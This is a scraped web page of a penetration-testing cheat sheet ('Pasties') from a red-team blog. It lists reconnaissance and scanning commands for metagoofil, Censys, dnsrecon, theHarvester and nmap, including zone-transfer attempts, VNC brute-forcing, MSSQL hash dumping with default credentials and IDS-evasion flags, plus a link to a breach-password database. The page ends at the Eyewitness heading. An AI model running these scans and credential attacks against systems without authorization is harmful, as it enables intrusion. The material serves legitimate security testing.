    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/threatexpress/edit/master/docs/blogs/2019/penetration-testing-pasties.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="penetration-testing-pasties">Penetration Testing Pasties<a class="headerlink" href="#penetration-testing-pasties" title="Permanent link">&para;</a></h1>
<p><strong>James Tubberville | January 11, 2019 | Tweet This Post: <a href="https://twitter.com/intent/tweet?url=http://threatexpress.com/blogs/2019/penetration-testing-pasties/&amp;text=Penetration testing and red teaming snipits."><i class="fa fa-twitter"></i></a></strong></p>
<p><img alt="" src="/img/pasties.png" /></p>
<p>'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest (<a href="https://www.twitter.com/joevest">@joevest</a>), Andrew Chiles (<a href="https://www.twitter.com/andrewchiles">@andrewchiles</a>), Derek Rushing, or myself (<a href="https://www.twitter.com/minis_io">@minis_io</a>) have found useful. Over time additional sections, section placeholders, snippets, and links were added for "quick reference" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki.</p>
<p>As usual, you can find an updated version of pasties (and other tools) on GitHub: <a href="https://github.com/threatexpress">https://github.com/threatexpress</a>.</p>
<p>Penetration Testing Framework</p>
<ul>
<li><a href="http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html">http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html</a></li>
</ul>
<p>Penetration Testing Execution Standard</p>
<ul>
<li><a href="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines">http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</a></li>
</ul>
<p>Good writeup on passive information gathering</p>
<ul>
<li><a href="http://www.securitysift.com/passive-reconnaissance/">http://www.securitysift.com/passive-reconnaissance/</a></li>
</ul>
<p>Password Breach Database, requires subscription</p>
<p><a href="https://leakbase.pw/">https://leakbase.pw/</a></p>
<h3 id="foca">FOCA<a class="headerlink" href="#foca" title="Permanent link">&para;</a></h3>
<h3 id="maltego">Maltego<a class="headerlink" href="#maltego" title="Permanent link">&para;</a></h3>
<h3 id="reconng">ReconNG<a class="headerlink" href="#reconng" title="Permanent link">&para;</a></h3>
<h3 id="metagoofil">Metagoofil<a class="headerlink" href="#metagoofil" title="Permanent link">&para;</a></h3>
<p>Source: <a href="http://resources.infosecinstitute.com/kali-reporting-tools/#gref">http://resources.infosecinstitute.com/kali-reporting-tools/#gref</a></p>
<p>Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc.</p>
<p>Metagoofil performs the following:</p>
<ul>
<li>Searches the given file type using the Google search engine</li>
<li>Downloads all the documents found</li>
<li>Extracts metadata from downloaded documents</li>
<li>Saves the result in HTML file</li>
</ul>
<p>Perform document metadata searching on target domain using first 200 google results
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">metagoofil</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="p">.</span><span class="n">com</span> <span class="o">-</span><span class="n">t</span> <span class="n">pdf</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">xls</span><span class="p">,</span><span class="n">ppt</span><span class="p">,</span><span class="n">odp</span><span class="p">,</span><span class="n">ods</span><span class="p">,</span><span class="n">docx</span><span class="p">,</span><span class="n">xlsx</span><span class="p">,</span><span class="n">pptx</span> <span class="o">-</span><span class="n">l</span> <span class="mi">200</span> <span class="o">-</span><span class="n">n</span> <span class="mi">5</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">metagoofil</span><span class="o">/</span> <span class="o">-</span><span class="n">f</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">metagoofil</span><span class="o">/</span><span class="k">result</span><span class="p">.</span><span class="n">html</span>
</pre></div>
</td></tr></table></p>
<h3 id="censysio">censys.io<a class="headerlink" href="#censysio" title="Permanent link">&para;</a></h3>
<p>Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed.</p>
<ul>
<li>Create an account and get an API key for use in ReconNG or manual searching</li>
<li><a href="https://censys.io/ipv4?q=">https://censys.io/ipv4?q=</a></li>
</ul>
<p>Python API
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="c1"># pip install censys</span>

    <span class="kn">import</span> <span class="nn">censys.ipv4</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">censys</span><span class="o">.</span><span class="n">ipv4</span><span class="o">.</span><span class="n">CensysIPv4</span><span class="p">(</span><span class="n">api_id</span><span class="o">=</span><span class="s2">&quot;Get from MyAccount at censys.io&quot;</span><span class="p">,</span> <span class="n">api_secret</span><span class="o">=</span><span class="s2">&quot;Get from MyAccount at censys.io&quot;</span><span class="p">)</span>
    <span class="n">ranges</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;X.X.X.0/24&quot;</span><span class="p">,</span> <span class="s2">&quot;X.X.X.0/24&quot;</span><span class="p">,</span> <span class="s2">&quot;X.X.X.0/24&quot;</span><span class="p">]</span>
    <span class="k">for</span> <span class="nb">range</span> <span class="ow">in</span> <span class="n">ranges</span><span class="p">:</span>
        <span class="n">results</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="nb">range</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;protocols&quot;</span><span class="p">]:</span>
                <span class="k">print</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;ip&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;,&quot;</span> <span class="o">+</span> <span class="n">port</span>
</pre></div>
</td></tr></table></p>
<h2 id="network-scanning">Network Scanning<a class="headerlink" href="#network-scanning" title="Permanent link">&para;</a></h2>
<h3 id="dsnrecon">dsnrecon<a class="headerlink" href="#dsnrecon" title="Permanent link">&para;</a></h3>
<p>Normal dns reverse lookup of IP range with CSV output
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dnsrecon</span> <span class="o">-</span><span class="n">t</span> <span class="n">rvl</span> <span class="o">-</span><span class="n">r</span> <span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="k">c</span> <span class="k">output</span><span class="p">.</span><span class="n">csv</span>
</pre></div>
</td></tr></table></p>
<p>Perform default enumeration of a domain 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dnsrecon</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="k">domain</span><span class="o">&gt;</span>
</pre></div>
</td></tr></table></p>
<p>Perform zone transfer attempt
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">dnsrecon</span> <span class="o">-</span><span class="nv">t</span> <span class="nv">axfr</span> <span class="o">-</span><span class="nv">d</span> <span class="o">&lt;</span><span class="nv">domain</span><span class="o">&gt;</span>

     $ <span class="nv">dnsrecon</span> <span class="o">-</span><span class="nv">h</span>
    <span class="nv">Version</span>: <span class="mi">0</span>.<span class="mi">8</span>.<span class="mi">10</span>
    <span class="nv">Usage</span>: <span class="nv">dnsrecon</span>.<span class="nv">py</span> <span class="o">&lt;</span><span class="nv">options</span><span class="o">&gt;</span>

    <span class="nv">Options</span>:
       <span class="o">-</span><span class="nv">h</span>, <span class="o">--</span><span class="nv">help</span>                   <span class="k">Show</span> <span class="nv">this</span> <span class="nv">help</span> <span class="nv">message</span> <span class="nv">and</span> <span class="k">exit</span>.
       <span class="o">-</span><span class="nv">d</span>, <span class="o">--</span><span class="nv">domain</span>      <span class="o">&lt;</span><span class="nv">domain</span><span class="o">&gt;</span>   <span class="nv">Target</span> <span class="nv">domain</span>.
       <span class="o">-</span><span class="nv">r</span>, <span class="o">--</span><span class="nv">range</span>       <span class="o">&lt;</span><span class="nv">range</span><span class="o">&gt;</span>    <span class="nv">IP</span> <span class="nv">range</span> <span class="k">for</span> <span class="nv">reverse</span> <span class="nv">lookup</span> <span class="nv">brute</span> <span class="nv">force</span> <span class="nv">in</span> <span class="nv">formats</span> <span class="ss">(</span><span class="nv">first</span><span class="o">-</span><span class="nv">last</span><span class="ss">)</span> <span class="nv">or</span> <span class="nv">in</span> <span class="ss">(</span><span class="nv">range</span><span class="o">/</span><span class="nv">bitmask</span><span class="ss">)</span>.
       <span class="o">-</span><span class="nv">n</span>, <span class="o">--</span><span class="nv">name_server</span> <span class="o">&lt;</span><span class="nv">name</span><span class="o">&gt;</span>     <span class="nv">Domain</span> <span class="nv">server</span> <span class="nv">to</span> <span class="nv">use</span>. <span class="k">If</span> <span class="nv">none</span> <span class="nv">is</span> <span class="nv">given</span>, <span class="nv">the</span> <span class="nv">SOA</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">target</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">used</span>.
       <span class="o">-</span><span class="nv">D</span>, <span class="o">--</span><span class="nv">dictionary</span>  <span class="o">&lt;</span><span class="nv">file</span><span class="o">&gt;</span>     <span class="nv">Dictionary</span> <span class="nv">file</span> <span class="nv">of</span> <span class="nv">subdomain</span> <span class="nv">and</span> <span class="nv">hostnames</span> <span class="nv">to</span> <span class="nv">use</span> <span class="k">for</span> <span class="nv">brute</span> <span class="nv">force</span>.
       <span class="o">-</span><span class="nv">f</span>                           <span class="nv">Filter</span> <span class="nv">out</span> <span class="nv">of</span> <span class="nv">brute</span> <span class="nv">force</span> <span class="nv">domain</span> <span class="nv">lookup</span>, <span class="nv">records</span> <span class="nv">that</span> <span class="nv">resolve</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">wildcard</span> <span class="nv">defined</span>
                                    <span class="nv">IP</span> <span class="nv">address</span> <span class="nv">when</span> <span class="nv">saving</span> <span class="nv">records</span>.
       <span class="o">-</span><span class="nv">t</span>, <span class="o">--</span><span class="nv">type</span>        <span class="o">&lt;</span><span class="nv">types</span><span class="o">&gt;</span>    <span class="nv">Type</span> <span class="nv">of</span> <span class="nv">enumeration</span> <span class="nv">to</span> <span class="nv">perform</span>:
                                    <span class="nv">std</span>       <span class="nv">SOA</span>, <span class="nv">NS</span>, <span class="nv">A</span>, <span class="nv">AAAA</span>, <span class="nv">MX</span> <span class="nv">and</span> <span class="nv">SRV</span> <span class="k">if</span> <span class="nv">AXRF</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">NS</span> <span class="nv">servers</span> <span class="nv">fail</span>.
                                    <span class="nv">rvl</span>       <span class="nv">Reverse</span> <span class="nv">lookup</span> <span class="nv">of</span> <span class="nv">a</span> <span class="nv">given</span> <span class="nv">CIDR</span> <span class="nv">or</span> <span class="nv">IP</span> <span class="nv">range</span>.
                                    <span class="nv">brt</span>       <span class="nv">Brute</span> <span class="nv">force</span> <span class="nv">domains</span> <span class="nv">and</span> <span class="nv">hosts</span> <span class="nv">using</span> <span class="nv">a</span> <span class="nv">given</span> <span class="nv">dictionary</span>.
                                    <span class="nv">srv</span>       <span class="nv">SRV</span> <span class="nv">records</span>.
                                    <span class="nv">axfr</span>      <span class="nv">Test</span> <span class="nv">all</span> <span class="nv">NS</span> <span class="nv">servers</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">zone</span> <span class="nv">transfer</span>.
                                    <span class="nv">goo</span>       <span class="nv">Perform</span> <span class="nv">Google</span> <span class="nv">search</span> <span class="k">for</span> <span class="nv">subdomains</span> <span class="nv">and</span> <span class="nv">hosts</span>.
                                    <span class="nv">snoop</span>     <span class="nv">Perform</span> <span class="nv">cache</span> <span class="nv">snooping</span> <span class="nv">against</span> <span class="nv">all</span> <span class="nv">NS</span> <span class="nv">servers</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">given</span> <span class="nv">domain</span>, <span class="nv">testing</span>
                                              <span class="nv">all</span> <span class="nv">with</span> <span class="nv">file</span> <span class="nv">containing</span> <span class="nv">the</span> <span class="nv">domains</span>, <span class="nv">file</span> <span class="nv">given</span> <span class="nv">with</span> <span class="o">-</span><span class="nv">D</span> <span class="nv">option</span>.
                                    <span class="nv">tld</span>       <span class="nv">Remove</span> <span class="nv">the</span> <span class="nv">TLD</span> <span class="nv">of</span> <span class="nv">given</span> <span class="nv">domain</span> <span class="nv">and</span> <span class="nv">test</span> <span class="nv">against</span> <span class="nv">all</span> <span class="nv">TLDs</span> <span class="nv">registered</span> <span class="nv">in</span> <span class="nv">IANA</span>.
                                    <span class="nv">zonewalk</span>  <span class="nv">Perform</span> <span class="nv">a</span> <span class="nv">DNSSEC</span> <span class="nv">zone</span> <span class="nv">walk</span> <span class="nv">using</span> <span class="nv">NSEC</span> <span class="nv">records</span>.
       <span class="o">-</span><span class="nv">a</span>                           <span class="nv">Perform</span> <span class="nv">AXFR</span> <span class="nv">with</span> <span class="nv">standard</span> <span class="nv">enumeration</span>.
       <span class="o">-</span><span class="nv">s</span>                           <span class="nv">Perform</span> <span class="nv">a</span> <span class="nv">reverse</span> <span class="nv">lookup</span> <span class="nv">of</span> <span class="nv">IPv4</span> <span class="nv">ranges</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">SPF</span> <span class="nv">record</span> <span class="nv">with</span> <span class="nv">standard</span> <span class="nv">enumeration</span>.
       <span class="o">-</span><span class="nv">g</span>                           <span class="nv">Perform</span> <span class="nv">Google</span> <span class="nv">enumeration</span> <span class="nv">with</span> <span class="nv">standard</span> <span class="nv">enumeration</span>.
       <span class="o">-</span><span class="nv">w</span>                           <span class="nv">Perform</span> <span class="nv">deep</span> <span class="nv">whois</span> <span class="nv">record</span> <span class="nv">analysis</span> <span class="nv">and</span> <span class="nv">reverse</span> <span class="nv">lookup</span> <span class="nv">of</span> <span class="nv">IP</span> <span class="nv">ranges</span> <span class="nv">found</span> <span class="nv">through</span>
                                    <span class="nv">Whois</span> <span class="nv">when</span> <span class="nv">doing</span> <span class="nv">a</span> <span class="nv">standard</span> <span class="nv">enumeration</span>.
       <span class="o">-</span><span class="nv">z</span>                           <span class="nv">Performs</span> <span class="nv">a</span> <span class="nv">DNSSEC</span> <span class="nv">zone</span> <span class="nv">walk</span> <span class="nv">with</span> <span class="nv">standard</span> <span class="nv">enumeration</span>.
       <span class="o">--</span><span class="nv">threads</span>         <span class="o">&lt;</span><span class="nv">number</span><span class="o">&gt;</span>   <span class="nv">Number</span> <span class="nv">of</span> <span class="nv">threads</span> <span class="nv">to</span> <span class="nv">use</span> <span class="nv">in</span> <span class="nv">reverse</span> <span class="nv">lookups</span>, <span class="nv">forward</span> <span class="nv">lookups</span>, <span class="nv">brute</span> <span class="nv">force</span> <span class="nv">and</span> <span class="nv">SRV</span>
                                    <span class="nv">record</span> <span class="nv">enumeration</span>.
       <span class="o">--</span><span class="nv">lifetime</span>        <span class="o">&lt;</span><span class="nv">number</span><span class="o">&gt;</span>   <span class="nv">Time</span> <span class="nv">to</span> <span class="k">wait</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">server</span> <span class="nv">to</span> <span class="nv">response</span> <span class="nv">to</span> <span class="nv">a</span> <span class="nv">query</span>.
       <span class="o">--</span><span class="nv">db</span>              <span class="o">&lt;</span><span class="nv">file</span><span class="o">&gt;</span>     <span class="nv">SQLite</span> <span class="mi">3</span> <span class="nv">file</span> <span class="nv">to</span> <span class="nv">save</span> <span class="nv">found</span> <span class="nv">records</span>.
       <span class="o">--</span><span class="nv">xml</span>             <span class="o">&lt;</span><span class="nv">file</span><span class="o">&gt;</span>     <span class="nv">XML</span> <span class="nv">file</span> <span class="nv">to</span> <span class="nv">save</span> <span class="nv">found</span> <span class="nv">records</span>.
       <span class="o">--</span><span class="nv">iw</span>                         <span class="k">Continue</span> <span class="nv">brute</span> <span class="nv">forcing</span> <span class="nv">a</span> <span class="nv">domain</span> <span class="nv">even</span> <span class="k">if</span> <span class="nv">a</span> <span class="nv">wildcard</span> <span class="nv">records</span> <span class="nv">are</span> <span class="nv">discovered</span>.
       <span class="o">-</span><span class="nv">c</span>, <span class="o">--</span><span class="nv">csv</span>         <span class="o">&lt;</span><span class="nv">file</span><span class="o">&gt;</span>     <span class="nv">Comma</span> <span class="nv">separated</span> <span class="nv">value</span> <span class="nv">file</span>.
       <span class="o">-</span><span class="nv">j</span>, <span class="o">--</span><span class="nv">json</span>        <span class="o">&lt;</span><span class="nv">file</span><span class="o">&gt;</span>     <span class="nv">JSON</span> <span class="nv">file</span>.
       <span class="o">-</span><span class="nv">v</span>                           <span class="k">Show</span> <span class="nv">attempts</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">brute</span> <span class="nv">force</span> <span class="nv">modes</span>.
</pre></div>
</td></tr></table></p>
<h3 id="theharvester">TheHarvester<a class="headerlink" href="#theharvester" title="Permanent link">&para;</a></h3>
<p>Perform lookup against <domain> with additional DNS reverse on all ranges discovered
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">theharvester</span> <span class="o">-</span><span class="nv">d</span> <span class="o">&lt;</span><span class="nv">domain</span><span class="o">&gt;</span> <span class="o">-</span><span class="nv">c</span> <span class="o">-</span><span class="nv">n</span> <span class="o">-</span><span class="nv">b</span> <span class="nv">google</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">1000</span> [<span class="o">-</span><span class="nv">f</span> <span class="nv">output</span>]

    <span class="nv">Usage</span>: <span class="nv">theharvester</span> <span class="nv">options</span> 

           <span class="o">-</span><span class="nv">d</span>: <span class="nv">Domain</span> <span class="nv">to</span> <span class="nv">search</span> <span class="nv">or</span> <span class="nv">company</span> <span class="nv">name</span>
           <span class="o">-</span><span class="nv">b</span>: <span class="nv">data</span> <span class="nv">source</span>: <span class="nv">google</span>, <span class="nv">googleCSE</span>, <span class="nv">bing</span>, <span class="nv">bingapi</span>, <span class="nv">pgp</span>
                            <span class="nv">linkedin</span>, <span class="nv">google</span><span class="o">-</span><span class="nv">profiles</span>, <span class="nv">people123</span>, <span class="nv">jigsaw</span>, 
                            <span class="nv">twitter</span>, <span class="nv">googleplus</span>, <span class="nv">all</span>

           <span class="o">-</span><span class="nv">s</span>: <span class="nv">Start</span> <span class="nv">in</span> <span class="nb">result</span> <span class="nv">number</span> <span class="nv">X</span> <span class="ss">(</span><span class="nv">default</span>: <span class="mi">0</span><span class="ss">)</span>
           <span class="o">-</span><span class="nv">v</span>: <span class="nv">Verify</span> <span class="nv">host</span> <span class="nv">name</span> <span class="nv">via</span> <span class="nv">dns</span> <span class="nv">resolution</span> <span class="nv">and</span> <span class="nv">search</span> <span class="k">for</span> <span class="nv">virtual</span> <span class="nv">hosts</span>
           <span class="o">-</span><span class="nv">f</span>: <span class="nv">Save</span> <span class="nv">the</span> <span class="nv">results</span> <span class="nv">into</span> <span class="nv">an</span> <span class="nv">HTML</span> <span class="nv">and</span> <span class="nv">XML</span> <span class="nv">file</span>
           <span class="o">-</span><span class="nv">n</span>: <span class="nv">Perform</span> <span class="nv">a</span> <span class="nv">DNS</span> <span class="nv">reverse</span> <span class="nv">query</span> <span class="nv">on</span> <span class="nv">all</span> <span class="nv">ranges</span> <span class="nv">discovered</span>
           <span class="o">-</span><span class="nv">c</span>: <span class="nv">Perform</span> <span class="nv">a</span> <span class="nv">DNS</span> <span class="nv">brute</span> <span class="nv">force</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">domain</span> <span class="nv">name</span>
           <span class="o">-</span><span class="nv">t</span>: <span class="nv">Perform</span> <span class="nv">a</span> <span class="nv">DNS</span> <span class="nv">TLD</span> <span class="nv">expansion</span> <span class="nv">discovery</span>
           <span class="o">-</span><span class="nv">e</span>: <span class="nv">Use</span> <span class="nv">this</span> <span class="nv">DNS</span> <span class="nv">server</span>
           <span class="o">-</span><span class="nv">l</span>: <span class="nv">Limit</span> <span class="nv">the</span> <span class="nv">number</span> <span class="nv">of</span> <span class="nv">results</span> <span class="nv">to</span> <span class="nv">work</span> <span class="nv">with</span><span class="ss">(</span><span class="nv">bing</span> <span class="nv">goes</span> <span class="nv">from</span> <span class="mi">50</span> <span class="nv">to</span> <span class="mi">50</span> <span class="nv">results</span>,
           <span class="o">-</span><span class="nv">h</span>: <span class="nv">use</span> <span class="nv">SHODAN</span> <span class="nv">database</span> <span class="nv">to</span> <span class="nv">query</span> <span class="nv">discovered</span> <span class="nv">hosts</span>
                <span class="nv">google</span> <span class="mi">100</span> <span class="nv">to</span> <span class="mi">100</span>, <span class="nv">and</span> <span class="nv">pgp</span> <span class="nv">doesn</span><span class="s1">&#39;</span><span class="s">t use this option)</span>

    <span class="nv">Examples</span>:
            <span class="nv">theharvester</span> <span class="o">-</span><span class="nv">d</span> <span class="nv">microsoft</span>.<span class="nv">com</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">500</span> <span class="o">-</span><span class="nv">b</span> <span class="nv">google</span>
            <span class="nv">theharvester</span> <span class="o">-</span><span class="nv">d</span> <span class="nv">microsoft</span>.<span class="nv">com</span> <span class="o">-</span><span class="nv">b</span> <span class="nv">pgp</span>
            <span class="nv">theharvester</span> <span class="o">-</span><span class="nv">d</span> <span class="nv">microsoft</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">200</span> <span class="o">-</span><span class="nv">b</span> <span class="nv">linkedin</span>
            <span class="nv">theharvester</span> <span class="o">-</span><span class="nv">d</span> <span class="nv">apple</span>.<span class="nv">com</span> <span class="o">-</span><span class="nv">b</span> <span class="nv">googleCSE</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">500</span> <span class="o">-</span><span class="nv">s</span> <span class="mi">300</span>
</pre></div>
</td></tr></table></p>
<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt">https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt</a></p>
<p>Host discovery
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">n</span> <span class="o">&lt;</span><span class="n">targets</span><span class="o">&gt;</span>
    <span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">&lt;</span><span class="k">host</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">run</span> <span class="n">this</span> <span class="k">second</span><span class="p">)</span>
    <span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">F</span> 
    <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">O</span> <span class="o">-</span><span class="n">T4</span> <span class="o">-</span><span class="n">v7</span> <span class="o">-</span><span class="n">sC</span>
</pre></div>
</td></tr></table></p>
<p>Open SMB shares
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="c1">--script=smb-enum-shares -p445</span>
</pre></div>
</td></tr></table></p>
<p>Open NFS Shares 
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">111</span><span class="p">,</span><span class="mi">2049</span> <span class="c1">--script nfs-ls,nfs-showmount</span>
</pre></div>
</td></tr></table></p>
<p>UDP scan: 
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">F</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">sV</span> <span class="c1">--open --reason -T5 &lt;targets&gt;</span>
</pre></div>
</td></tr></table></p>
<p>Anonymous FTP
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">p21</span>
    <span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">Pn</span><span class="o">-</span><span class="n">vv</span> <span class="c1">--open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 &lt;targets&gt;</span>
</pre></div>
</td></tr></table></p>
<p>VNC Brute
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="c1">--script=vnc-brute -p5800,5900</span>
</pre></div>
</td></tr></table></p>
<p>Rawr Scan
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="c1">--open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web</span>
</pre></div>
</td></tr></table></p>
<p>MSSQL Scan
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">vv</span><span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">Pn</span><span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p1433</span> <span class="c1">--script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa &lt;targets&gt; -oA &lt;outfile&gt;</span>
</pre></div>
</td></tr></table></p>
<p>HTTP Scan
    <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nmap</span> <span class="o">-</span><span class="n">vv</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">Pn</span><span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">443</span><span class="p">,</span><span class="mi">8080</span> <span class="c1">--script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt &lt;targets&gt; -oA &lt;outfile&gt;</span>
</pre></div>
</td></tr></table></p>
<h4 id="ids-evasion">IDS Evasion<a class="headerlink" href="#ids-evasion" title="Permanent link">&para;</a></h4>
<p>Append extra random data to change default packet lengths
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="err"></span><span class="k">data</span><span class="o">-</span><span class="k">length</span> <span class="mi">15</span>
</pre></div>
</td></tr></table></p>
<p>Randomize scan order
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">-</span><span class="n">randomize</span><span class="o">-</span><span class="n">hosts</span>
</pre></div>
</td></tr></table></p>
<h3 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h3>
<h4 id="eyewitness">Eyewitness<a class="headerlink" href="#eyewitness" title="Permanent link">&para;</a></h4>
<p>Get the most recent version
